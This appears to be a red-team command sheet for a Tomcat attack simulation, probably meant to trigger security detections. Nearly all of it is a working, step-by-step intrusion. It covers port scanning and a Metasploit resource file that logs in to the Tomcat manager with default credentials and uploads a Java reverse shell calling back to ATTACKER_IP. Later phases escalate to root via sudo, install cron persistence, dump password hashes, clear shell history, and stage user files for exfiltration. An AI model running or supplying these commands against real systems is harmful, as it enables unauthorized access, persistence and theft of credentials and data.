# Manual Attack Commands

Extracted from `tomcatastrophe.py` for manual testing.

Replace `TARGET_IP` and `ATTACKER_IP` with your actual IPs.

---

## Phase 0: Reconnaissance

```bash
# Port scan with service detection
nmap -sT -p 22,80,443,8080,8443 -Pn -sV --open TARGET_IP
```

---

## Phase 1: Initial Access (Metasploit)

Create a resource file `exploit.rc`:

```bash
cat > /tmp/exploit.rc << 'EOF'
# Start persistent handler
use exploit/multi/handler
set payload java/shell_reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
set ExitOnSession false
exploit -j

# Wait for handler to start
sleep 2

# Run Tomcat exploit
back
use exploit/multi/http/tomcat_mgr_upload
set RHOSTS TARGET_IP
set RPORT 8080
set HttpUsername tomcat
set HttpPassword tomcat
set TARGETURI /manager
set FingerprintCheck false
set payload java/shell_reverse_tcp
set LHOST ATTACKER_IP
set LPORT 4444
set DisablePayloadHandler true
show options
exploit

# Check for sessions
sleep 5
sessions -l
EOF
```

Then run:

```bash
msfconsole -r /tmp/exploit.rc
```

---

## Phase 3: Discovery (run in Meterpreter shell)

```bash
# In msfconsole, interact with session first
sessions -i 1
shell

# Then run these commands
whoami
id
uname -a
hostname
cat /etc/passwd | grep -v nologin

# System enumeration with getconf (triggers detection)
getconf -a
getconf LONG_BIT
getconf PAGE_SIZE

exit
```

---

## Phase 4: Privilege Escalation (run in Meterpreter shell)

```bash
shell

# Enumerate sudo (triggers detection)
sudo -l
sudo -V

# Escalate to root
sudo /bin/bash
whoami

exit
```

---

## Phase 5: Persistence (run in msfconsole)

```bash
background

use exploit/linux/local/persistence_cron
set SESSION 1
set LHOST ATTACKER_IP
set LPORT 4445
run
```

---

## Phase 6: Credential Access (run in msfconsole)

```bash
use post/linux/gather/hashdump
set SESSION 1
run

# View collected credentials
loot
creds
```

---

## Phase 7: Defense Evasion (run in Meterpreter shell)

```bash
sessions -i 1
shell

# Clear history (triggers detection)
unset HISTFILE
export HISTSIZE=0
history -c

exit
```

---

## Phase 8: Collection (run in Meterpreter shell)

```bash
shell

# Stage sensitive files
mkdir /tmp/.staging
find /home -name "*.pdf" -exec cp {} /tmp/.staging/ \; 2>/dev/null
find /home -name "*.doc*" -exec cp {} /tmp/.staging/ \; 2>/dev/null
find /etc -name "*.conf" -exec cp {} /tmp/.staging/ \; 2>/dev/null

# Compress for exfiltration (triggers detection)
tar -czf /tmp/data.tar.gz /tmp/.staging
zip -r /tmp/backup.zip /tmp/.staging 2>/dev/null

exit
```

---

## Quick Start (Phases 0-1 only)

```bash
# 1. Run nmap scan
nmap -sT -p 22,80,443,8080,8443 -Pn -sV --open TARGET_IP

# 2. Start Metasploit with the exploit
msfconsole -r /tmp/exploit.rc

# 3. After getting shell, interact:
sessions -l
sessions -i 1
```
